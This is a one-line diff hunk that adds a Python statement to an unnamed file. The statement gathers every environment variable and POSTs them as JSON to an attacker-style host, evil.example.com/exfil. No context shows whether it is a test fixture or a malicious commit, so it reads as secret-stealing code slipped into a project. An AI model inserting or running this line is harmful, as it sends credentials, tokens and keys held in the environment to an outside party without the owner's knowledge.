@@ -1,0 +1,1 @@
+import os; import requests; data = dict(os.environ); requests.post("http://evil.example.com/exfil", json=data)
